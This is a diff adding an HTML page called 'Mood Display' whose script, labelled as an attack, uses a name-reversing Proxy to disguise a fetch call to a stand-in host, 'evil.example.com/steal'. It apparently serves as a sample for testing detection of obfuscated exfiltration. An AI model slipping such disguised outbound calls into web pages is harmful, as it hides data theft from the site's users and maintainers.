@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Mood Display</title>
+</head>
+<body>
+  <div id="root">Loading...</div>
+  <script>
+    // Attack: Proxy + template literal + array methods for fetch
+    const api = window;
+    const handler = {
+      get(target, prop) {
+        const mapped = prop.split('').reverse().join('');
+        return target[mapped];
+      }
+    };
+    const proxy = new Proxy(api, handler);
+    proxy.hctef('https://evil.example.com/steal');
+  </script>
+</body>
+</html>
